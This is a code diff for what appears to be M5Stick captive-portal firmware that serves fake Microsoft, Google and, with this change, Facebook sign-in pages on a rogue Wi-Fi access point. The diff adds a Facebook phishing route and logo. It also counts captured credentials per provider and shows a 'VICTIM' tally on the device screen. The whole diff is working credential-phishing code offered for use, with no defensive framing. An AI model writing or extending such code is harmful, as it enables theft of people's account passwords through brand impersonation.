@@ -36,6 +36,7 @@
 
 #include "fonts.h"
 #include "logo.h"
+#include "logos2.h"
 
 #if defined(M5STICK_C_PLUS)
 #define DISPLAY M5.Lcd
@@ -99,7 +100,7 @@ LGFX_Sprite spr = LGFX_Sprite(&M5.Lcd);
 
 #if defined(LANGUAGE_EN_US)
 #define LOGIN_TITLE "Sign in"
-#define SELECT_MESSAGE "Select your E-mail Account Provider"
+#define SELECT_MESSAGE "Select your Account Provider"
 #define LOGIN_SUBTITLE "Use your {provider} Account"
 #define LOGIN_EMAIL_PLACEHOLDER "Email"
 #define LOGIN_PASSWORD_PLACEHOLDER "Password"
@@ -108,7 +109,7 @@ LGFX_Sprite spr = LGFX_Sprite(&M5.Lcd);
 #define LOGIN_AFTER_MESSAGE "Please wait a few minutes. Soon you will be able to access the internet."
 #elif defined(LANGUAGE_PT_BR)
 #define LOGIN_TITLE "Fazer login"
-#define SELECT_MESSAGE "Selecione sua plataforma de e-mail"
+#define SELECT_MESSAGE "Selecione a plataforma desejada"
 #define LOGIN_SUBTITLE "Use sua Conta {provider}"
 #define LOGIN_EMAIL_PLACEHOLDER "E-mail"
 #define LOGIN_PASSWORD_PLACEHOLDER "Senha"
@@ -133,8 +134,9 @@ String hr,mi,se;
 
 byte use_google = 1;
 byte use_microsoft = 1;
+byte use_facebook = 1;
 
-int cp1,cp2;
+int cp1,cp2,cp3;
 String last_auth_prov[4]={"", "", "", ""};
 int last_auth_idx[4]={0, 0, 0, 0};
 String last_auth_username[4]={"", "", "", ""};
@@ -282,6 +284,10 @@ void setupWebServer() {
     webServer.send(HTTP_CODE, "text/html", provider_GET("msft"));
   });
 
+  webServer.on("/facebook", []() {
+    webServer.send(HTTP_CODE, "text/html", provider_GET("facebook"));
+  });
+
   webServer.on("/config", []() {
     webServer.send(HTTP_CODE, "text/html", config_GET());
   });
@@ -292,8 +298,15 @@ void setupWebServer() {
 
   webServer.onNotFound([]() {
     lastActivity = millis();
-    if ((use_google == 1) && (use_microsoft == 1)){
+    int pc = 0;
+    if (use_google == 1) pc = pc + 1;
+    if (use_microsoft == 1) pc = pc + 1;
+    if (use_facebook == 1) pc = pc + 1;
+
+    if (pc >= 2){
       webServer.send(HTTP_CODE, "text/html", index_GET());
+    }else if (use_facebook == 1){
+      webServer.send(HTTP_CODE, "text/html", provider_GET("facebook"));
     }else if (use_microsoft == 1){
       webServer.send(HTTP_CODE, "text/html", provider_GET("msft"));
     }else{
@@ -401,7 +414,7 @@ void printScreen() {
   spr.setTextColor(WHITE,BLACK);
   spr.drawString("VICTIM",10,8,2);
   spr.setFreeFont(&DSEG7_Classic_Bold_32);
-  spr.drawString(String(cp1 + cp2),10,30);
+  spr.drawString(String(cp1 + cp2 + cp3),10,30);
 
   spr.setTextColor(WHITE,0x0083);
   spr.drawString("LAST AUTH",13,122,2);
@@ -442,15 +455,21 @@ void printScreen() {
   spr.setTextDatum(4);
   spr.setTextColor(WHITE,color);
   spr.drawString("MSFT",14,82,2);
-  spr.drawString("GOOGLE",74,82,2);
+  if (use_google && use_facebook) {
+    spr.drawString("OTHER",74,82,2);
+  }else if (use_facebook) {
+    spr.drawString("FACE",74,82,2);
+  }else{
+    spr.drawString("GOOGLE",74,82,2);
+  }
   spr.setFreeFont(&DSEG7_Classic_Bold_17);
   if (use_microsoft) {
     spr.drawString(String(cp1),17,102);
   }else{
     spr.drawString("na",17,102);
   }
-  if (use_google) {
-    spr.drawString(String(cp2),77,102);
+  if (use_google || use_facebook) {
+    spr.drawString(String(cp2 + cp3),77,102);
   }else{
     spr.drawString("na",77,102);
   }
@@ -539,6 +558,20 @@ String index_GET() {
   String loginTitle = String(LOGIN_TITLE);
   String loginSubTitle = String(SELECT_MESSAGE);
 
+  String btn = "";
+
+  if (use_microsoft == 1){
+    btn = btn + "<button type='button' style='background: transparent' class='containerlogo' onclick='javascript:location.href=\"/microsoft\"'>" + String(LOGO_MSFT) + "</button>";
+  }
+
+  if (use_google == 1){
+    btn = btn + "<button type='button' style='background: transparent' class='containerlogo' onclick='javascript:location.href=\"/google\"'>" + String(LOGO_GOOGLE) + "</button>";
+  }
+
+  if (use_facebook == 1){
+    btn = btn + "<button type='button' style='background: transparent' class='containerlogo' onclick='javascript:location.href=\"/facebook\"'>" + String(LOGO_FACEBOOK) + "</button>";
+  }
+
   String html =
     "<!DOCTYPE html>"
     "<html>"
@@ -559,14 +592,7 @@ String index_GET() {
                    "      <div style='min-height: 100px'>"
                    "       <center><div class='containertitle'>" + loginTitle + "</div><div class='containersubtitle'>" + loginSubTitle +  "</div></center>"
                    "     </div>"
-                   "     <div style='min-height: 150px;'>"
-                   "       <button type='button' style='background: transparent' class='containerlogo' onclick='javascript:location.href=\"/microsoft\"'>"
-                   "         <svg viewBox='0 0 108 24' width='108' height='24' xmlns='http://www.w3.org/2000/svg'><path d='M44.836,4.6V18.4h-2.4V7.583H42.4L38.119,18.4H36.531L32.142,7.583h-.029V18.4H29.9V4.6h3.436L37.3,14.83h.058L41.545,4.6Zm2,1.049a1.268,1.268,0,0,1,.419-.967,1.413,1.413,0,0,1,1-.39,1.392,1.392,0,0,1,1.02.4,1.3,1.3,0,0,1,.4.958,1.248,1.248,0,0,1-.414.953,1.428,1.428,0,0,1-1.01.385A1.4,1.4,0,0,1,47.25,6.6a1.261,1.261,0,0,1-.409-.948M49.41,18.4H47.081V8.507H49.41Zm7.064-1.694a3.213,3.213,0,0,0,1.145-.241,4.811,4.811,0,0,0,1.155-.635V18a4.665,4.665,0,0,1-1.266.481,6.886,6.886,0,0,1-1.554.164,4.707,4.707,0,0,1-4.918-4.908,5.641,5.641,0,0,1,1.4-3.932,5.055,5.055,0,0,1,3.955-1.545,5.414,5.414,0,0,1,1.324.168,4.431,4.431,0,0,1,1.063.39v2.233a4.763,4.763,0,0,0-1.1-.611,3.184,3.184,0,0,0-1.15-.217,2.919,2.919,0,0,0-2.223.9,3.37,3.37,0,0,0-.847,2.416,3.216,3.216,0,0,0,.813,2.338,2.936,2.936,0,0,0,2.209.837M65.4,8.343a2.952,2.952,0,0,1,.5.039,2.1,2.1,0,0,1,.375.1v2.358a2.04,2.04,0,0,0-.534-.255,2.646,2.646,0,0,0-.852-.12,1.808,1.808,0,0,0-1.448.722,3.467,3.467,0,0,0-.592,2.223V18.4H60.525V8.507h2.329v1.559h.038A2.729,2.729,0,0,1,63.855,8.8,2.611,2.611,0,0,1,65.4,8.343m1,5.254A5.358,5.358,0,0,1,67.792,9.71a5.1,5.1,0,0,1,3.85-1.434,4.742,4.742,0,0,1,3.623,1.381,5.212,5.212,0,0,1,1.3,3.729,5.257,5.257,0,0,1-1.386,3.83,5.019,5.019,0,0,1-3.772,1.424,4.935,4.935,0,0,1-3.652-1.352A4.987,4.987,0,0,1,66.406,13.6m2.425-.077a3.535,3.535,0,0,0,.7,2.368,2.505,2.505,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.389,2.389,0,0,0-1.929-.813,2.44,2.44,0,0,0-1.988.852,3.707,3.707,0,0,0-.707,2.43m11.2-2.416a1,1,0,0,0,.318.785,5.426,5.426,0,0,0,1.4.717,4.767,4.767,0,0,1,1.959,1.256,2.6,2.6,0,0,1,.563,1.689A2.715,2.715,0,0,1,83.2,17.794a4.558,4.558,0,0,1-2.9.847,6.978,6.978,0,0,1-1.362-.149,6.047,6.047,0,0,1-1.265-.38v-2.29a5.733,5.733,0,0,0,1.367.7,4,4,0,0,0,1.328.26,2.365,2.365,0,0,0,1.164-.221.79.79,0,0,0,.375-.741,1.029,1.029,0,0,0-.39-.813,5.768,5.768,0,0,0-1.477-.765,4.564,4.564,0,0,1-1.829-1.213,2.655,2.655,0,0,1-.539-1.713,2.706,2.706,0,0,1,1.063-2.2A4.243,4.243,0,0,1,81.5,8.256a6.663,6.663,0,0,1,1.164.115,5.161,5.161,0,0,1,1.078.3v2.214a4.974,4.974,0,0,0-1.078-.529,3.6,3.6,0,0,0-1.222-.221,1.781,1.781,0,0,0-1.034.26.824.824,0,0,0-.371.712M85.278,13.6A5.358,5.358,0,0,1,86.664,9.71a5.1,5.1,0,0,1,3.849-1.434,4.743,4.743,0,0,1,3.624,1.381,5.212,5.212,0,0,1,1.3,3.729,5.259,5.259,0,0,1-1.386,3.83,5.02,5.02,0,0,1-3.773,1.424,4.934,4.934,0,0,1-3.652-1.352A4.987,4.987,0,0,1,85.278,13.6m2.425-.077a3.537,3.537,0,0,0,.7,2.368,2.506,2.506,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.39,2.39,0,0,0-1.93-.813,2.439,2.439,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m15.464-3.109H99.7V18.4H97.341V10.412H95.686V8.507h1.655V7.13a3.423,3.423,0,0,1,1.015-2.555,3.561,3.561,0,0,1,2.6-1,5.807,5.807,0,0,1,.751.043,2.993,2.993,0,0,1,.577.13V5.764a2.422,2.422,0,0,0-.4-.164,2.107,2.107,0,0,0-.664-.1,1.407,1.407,0,0,0-1.126.457A2.017,2.017,0,0,0,99.7,7.313V8.507h3.469V6.283l2.339-.712V8.507h2.358v1.906h-2.358v4.629a1.951,1.951,0,0,0,.332,1.29,1.326,1.326,0,0,0,1.044.375,1.557,1.557,0,0,0,.486-.1,2.294,2.294,0,0,0,.5-.231V18.3a2.737,2.737,0,0,1-.736.231,5.029,5.029,0,0,1-1.015.106,2.887,2.887,0,0,1-2.209-.784,3.341,3.341,0,0,1-.736-2.363Z' fill='#737373'/><rect width='10.931' height='10.931' fill='#f25022'/><rect x='12.069' width='10.931' height='10.931' fill='#7fba00'/><rect y='12.069' width='10.931' height='10.931' fill='#00a4ef'/><rect x='12.069' y='12.069' width='10.931' height='10.931' fill='#ffb900'/></svg>"
-                   "       </button>"
-                   "       <button type='button' style='background: transparent' class='containerlogo' onclick='javascript:location.href=\"/google\"'>"
-                   "         <svg viewBox='0 0 75 24' width='75' height='24' xmlns='http://www.w3.org/2000/svg' aria-hidden='true' class='BFr46e xduoyf'><g id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z'></path></g><g id='YGlOvc'><path fill='#34a853' d='M58.193.67h2.564v17.44h-2.564z'></path></g><g id='BWfIk'><path fill='#4285f4' d='M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'></path></g><g id='e6m3fd'><path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z'></path></g><g id='vbkDmc'><path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'></path></g><g id='idEJde'><path fill='#4285f4' d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z'></path></g></svg>"
-                   "       </button>"
-                   "     </div>"
+                   "     <div style='min-height: 150px;'>" + btn + "</div>"
                    "   </div>"
              "  </div>"
              "</body>"
@@ -580,6 +606,8 @@ String provider_GET(String provider) {
   provider.toLowerCase();
   if ((provider == "microsoft") || (provider == "msft")){
     provider = "Microsoft";
+  }else if (provider == "facebook"){
+    provider = "Facebook";
   }else{
     provider = "Google";
   }
@@ -613,10 +641,13 @@ String index_POST() {
   if ((provider == "microsoft") || (provider == "msft")){
     provider = "msft";
     cp1 = cp1 + 1;
+  }else if (provider == "facebook"){
+    provider = "face";
+    cp3 = cp3 + 1;
   }else{
     cp2 = cp2 + 1;
   }
-  totalCapturedCredentials = cp1 + cp2;
+  totalCapturedCredentials = cp1 + cp2 + cp3;
 
   for(int i=3;i>=1;i--){
     if (last_auth_idx[i-1] > 0){
@@ -638,6 +669,8 @@ String index_POST() {
 
   if ((provider == "microsoft") || (provider == "msft")){
     provider = "Microsoft";
+  }else if ((provider == "facebook") || (provider == "face")){
+    provider = "Facebook";
   }else{
     provider = "Google";
   }
@@ -702,9 +735,11 @@ String getHtmlContents(String body, String provider) {
   String logo = "";
   if ((provider == "microsoft") || (provider == "msft")){
     provider = "msft";
-    logo = "<svg viewBox='0 0 108 24' width='108' height='24' xmlns='http://www.w3.org/2000/svg'><path d='M44.836,4.6V18.4h-2.4V7.583H42.4L38.119,18.4H36.531L32.142,7.583h-.029V18.4H29.9V4.6h3.436L37.3,14.83h.058L41.545,4.6Zm2,1.049a1.268,1.268,0,0,1,.419-.967,1.413,1.413,0,0,1,1-.39,1.392,1.392,0,0,1,1.02.4,1.3,1.3,0,0,1,.4.958,1.248,1.248,0,0,1-.414.953,1.428,1.428,0,0,1-1.01.385A1.4,1.4,0,0,1,47.25,6.6a1.261,1.261,0,0,1-.409-.948M49.41,18.4H47.081V8.507H49.41Zm7.064-1.694a3.213,3.213,0,0,0,1.145-.241,4.811,4.811,0,0,0,1.155-.635V18a4.665,4.665,0,0,1-1.266.481,6.886,6.886,0,0,1-1.554.164,4.707,4.707,0,0,1-4.918-4.908,5.641,5.641,0,0,1,1.4-3.932,5.055,5.055,0,0,1,3.955-1.545,5.414,5.414,0,0,1,1.324.168,4.431,4.431,0,0,1,1.063.39v2.233a4.763,4.763,0,0,0-1.1-.611,3.184,3.184,0,0,0-1.15-.217,2.919,2.919,0,0,0-2.223.9,3.37,3.37,0,0,0-.847,2.416,3.216,3.216,0,0,0,.813,2.338,2.936,2.936,0,0,0,2.209.837M65.4,8.343a2.952,2.952,0,0,1,.5.039,2.1,2.1,0,0,1,.375.1v2.358a2.04,2.04,0,0,0-.534-.255,2.646,2.646,0,0,0-.852-.12,1.808,1.808,0,0,0-1.448.722,3.467,3.467,0,0,0-.592,2.223V18.4H60.525V8.507h2.329v1.559h.038A2.729,2.729,0,0,1,63.855,8.8,2.611,2.611,0,0,1,65.4,8.343m1,5.254A5.358,5.358,0,0,1,67.792,9.71a5.1,5.1,0,0,1,3.85-1.434,4.742,4.742,0,0,1,3.623,1.381,5.212,5.212,0,0,1,1.3,3.729,5.257,5.257,0,0,1-1.386,3.83,5.019,5.019,0,0,1-3.772,1.424,4.935,4.935,0,0,1-3.652-1.352A4.987,4.987,0,0,1,66.406,13.6m2.425-.077a3.535,3.535,0,0,0,.7,2.368,2.505,2.505,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.389,2.389,0,0,0-1.929-.813,2.44,2.44,0,0,0-1.988.852,3.707,3.707,0,0,0-.707,2.43m11.2-2.416a1,1,0,0,0,.318.785,5.426,5.426,0,0,0,1.4.717,4.767,4.767,0,0,1,1.959,1.256,2.6,2.6,0,0,1,.563,1.689A2.715,2.715,0,0,1,83.2,17.794a4.558,4.558,0,0,1-2.9.847,6.978,6.978,0,0,1-1.362-.149,6.047,6.047,0,0,1-1.265-.38v-2.29a5.733,5.733,0,0,0,1.367.7,4,4,0,0,0,1.328.26,2.365,2.365,0,0,0,1.164-.221.79.79,0,0,0,.375-.741,1.029,1.029,0,0,0-.39-.813,5.768,5.768,0,0,0-1.477-.765,4.564,4.564,0,0,1-1.829-1.213,2.655,2.655,0,0,1-.539-1.713,2.706,2.706,0,0,1,1.063-2.2A4.243,4.243,0,0,1,81.5,8.256a6.663,6.663,0,0,1,1.164.115,5.161,5.161,0,0,1,1.078.3v2.214a4.974,4.974,0,0,0-1.078-.529,3.6,3.6,0,0,0-1.222-.221,1.781,1.781,0,0,0-1.034.26.824.824,0,0,0-.371.712M85.278,13.6A5.358,5.358,0,0,1,86.664,9.71a5.1,5.1,0,0,1,3.849-1.434,4.743,4.743,0,0,1,3.624,1.381,5.212,5.212,0,0,1,1.3,3.729,5.259,5.259,0,0,1-1.386,3.83,5.02,5.02,0,0,1-3.773,1.424,4.934,4.934,0,0,1-3.652-1.352A4.987,4.987,0,0,1,85.278,13.6m2.425-.077a3.537,3.537,0,0,0,.7,2.368,2.506,2.506,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.39,2.39,0,0,0-1.93-.813,2.439,2.439,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m15.464-3.109H99.7V18.4H97.341V10.412H95.686V8.507h1.655V7.13a3.423,3.423,0,0,1,1.015-2.555,3.561,3.561,0,0,1,2.6-1,5.807,5.807,0,0,1,.751.043,2.993,2.993,0,0,1,.577.13V5.764a2.422,2.422,0,0,0-.4-.164,2.107,2.107,0,0,0-.664-.1,1.407,1.407,0,0,0-1.126.457A2.017,2.017,0,0,0,99.7,7.313V8.507h3.469V6.283l2.339-.712V8.507h2.358v1.906h-2.358v4.629a1.951,1.951,0,0,0,.332,1.29,1.326,1.326,0,0,0,1.044.375,1.557,1.557,0,0,0,.486-.1,2.294,2.294,0,0,0,.5-.231V18.3a2.737,2.737,0,0,1-.736.231,5.029,5.029,0,0,1-1.015.106,2.887,2.887,0,0,1-2.209-.784,3.341,3.341,0,0,1-.736-2.363Z' fill='#737373'/><rect width='10.931' height='10.931' fill='#f25022'/><rect x='12.069' width='10.931' height='10.931' fill='#7fba00'/><rect y='12.069' width='10.931' height='10.931' fill='#00a4ef'/><rect x='12.069' y='12.069' width='10.931' height='10.931' fill='#ffb900'/></svg>";
+    logo = String(LOGO_MSFT);
+  }else if (provider == "facebook"){
+    logo = String(LOGO_FACEBOOK);
   }else{
-    logo = "<svg viewBox='0 0 75 24' width='75' height='24' xmlns='http://www.w3.org/2000/svg' aria-hidden='true' class='BFr46e xduoyf'><g id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z'></path></g><g id='YGlOvc'><path fill='#34a853' d='M58.193.67h2.564v17.44h-2.564z'></path></g><g id='BWfIk'><path fill='#4285f4' d='M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'></path></g><g id='e6m3fd'><path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z'></path></g><g id='vbkDmc'><path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'></path></g><g id='idEJde'><path fill='#4285f4' d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z'></path></g></svg>";
+    logo = String(LOGO_GOOGLE);
   }
 
   String html =
@@ -741,7 +776,7 @@ String clear_GET() {
   String email = "<p></p>";
   String password = "<p></p>";
   capturedCredentialsHtml = "<p></p>";
-  totalCapturedCredentials = cp1 = cp2 = 0;
+  totalCapturedCredentials = cp1 = cp2 = cp3 = 0;
 
   for(int i=0;i<4;i++){
     last_auth_prov[i] = "";
@@ -760,23 +795,26 @@ String creds_GET() {
 
 String config_GET() {
   
-  return getAdminHtmlContents("<center><div class='containertitle'>Config</div><div class='containersubtitle'>Adjust your configuration</div></center><form action='/post_config' id='login-form'><input name='ssid' class='input-field' type='text' placeholder='Wifi SSID' value='"+ apSsidName +"' required><div class='containermsg'>Selected enabled providers</div><input name='msft' class='input-field' type='checkbox' value='on' checked />Micosoft<input name='google' class='input-field' type='checkbox' value='on' checked />Google<div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>Save</button></div></form>");
+  return getAdminHtmlContents("<center><div class='containertitle'>Config</div><div class='containersubtitle'>Adjust your configuration</div></center><form action='/post_config' id='login-form'><input name='ssid' class='input-field' type='text' placeholder='Wifi SSID' value='"+ apSsidName +"' required><div class='containermsg'>Selected enabled providers</div><input name='msft' class='input-field' type='checkbox' value='on' checked />Micosoft<br /><input name='google' class='input-field' type='checkbox' value='on' checked />Google<br /><input name='facebook' class='input-field' type='checkbox' value='on' checked />Facebook<div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>Save</button></div></form>");
 }
 
 String config_POST() {
   String ssid = getInputValue("ssid");
   String msft = getInputValue("msft");
   String google = getInputValue("google");
+  String facebook = getInputValue("facebook");
 
   String oldSSid = apSsidName;
   if (!ssid.isEmpty()) apSsidName = ssid;
   
   use_microsoft = 0;
   use_google = 0;
+  use_facebook = 0;
   if (!msft.isEmpty() && msft == "on") use_microsoft = 1;
   if (!google.isEmpty() && google == "on") use_google = 1;
+  if (!facebook.isEmpty() && facebook == "on") use_facebook = 1;
 
-  if ((use_microsoft == 0) && (use_google == 0)) use_google = 1;
+  if ((use_microsoft == 0) && (use_google == 0) && (use_facebook == 0)) use_google = 1;
 
   if (oldSSid != apSsidName) setupWiFi();
 
